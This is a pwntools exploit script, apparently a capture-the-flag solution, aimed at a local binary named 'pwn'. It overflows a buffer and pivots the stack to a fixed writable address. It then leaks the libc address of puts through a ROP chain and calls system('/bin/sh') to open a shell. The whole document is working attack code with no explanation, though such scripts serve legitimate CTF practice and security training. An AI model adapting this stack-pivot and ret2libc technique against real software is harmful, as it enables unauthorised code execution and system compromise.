from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process('./pwn')
s = gdb.debug('./pwn','''

b *0x4006C4
b *vuln 
watch *0x601800
''')

elf=ELF('./pwn')
libc=ELF("./libc.so.6")

leave_ret=0x4006DB
pivot_read=0x4006C4
fake_stack=0x601800

s.sendafter(b"overflow?\n",b"a"*0x30+p64(fake_stack+0x30)+p64(pivot_read))

pause()

rdi=0x0000000000400773
rsi_r15=0x0000000000400771
rbp=0x00000000004005b0
s.send(flat([
    rdi,elf.got['puts'],
    elf.plt['puts'],
    rbp,fake_stack+0x50+0x30,
    pivot_read,
    fake_stack-8,leave_ret
]))
pause()
libc.address=u64(s.recvuntil(b"\x7f")+b"\x00\x00")-libc.sym.puts
success(hex(libc.address))
rdx_rbx=libc.address+0x00000000000904a9
rsi=libc.address+0x000000000002be51
ogg=libc.address+0xebc88
s.send(flat([
    rdi,fake_stack+0x78,
    libc.sym.system,
    0,0,
    b"/bin/sh\x00",
    fake_stack+0x50-8,leave_ret
]))
s.interactive()